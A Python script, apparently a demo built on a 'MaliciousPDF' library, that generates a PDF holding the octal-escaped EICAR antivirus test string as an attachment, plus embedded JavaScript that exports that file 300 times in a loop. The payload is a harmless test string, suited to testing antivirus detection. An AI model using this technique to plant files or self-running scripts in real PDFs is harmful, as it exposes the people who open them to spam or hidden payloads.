from MaliciousPDF import *
from datetime import datetime
from io import StringIO

file, catalog, outlines, pages, page = pdf_bases("EicarSpam.pdf", author='MauriceLambert', date=datetime(2016, 6, 22, 16, 52, 36), title='EicarSpam PDF', producer='EicarSpam')
add_text(
    page,
    'Eicar Spam using Javascript into PDF',
    (612 / 2 - 36 // 2 * 16, 720),
    text_size=16,
    outline=True,
)
embeddedfile = MaliciousEmbeddedFile(catalog, StringIO("\130\065\117\041\120\045\100\101\120\133\064\134\120\132\130\065\064\050\120\136\051\067\103\103\051\067\175\044\105\111\103\101\122\055\123\124\101\116\104\101\122\104\055\101\116\124\111\126\111\122\125\123\055\124\105\123\124\055\106\111\114\105\041\044\110\053\110\052"), "eicar.txt")
embeddedfile.javascript.dictionary.add_value(PdfName("JS"), PdfString("for (var i = 0; i < 300; i++) {this.exportDataObject({cName: 'eicar.txt',nLaunch: 0});}")) # cDIPath raise NotAllowedError (file location to export the eicar file
file.write()

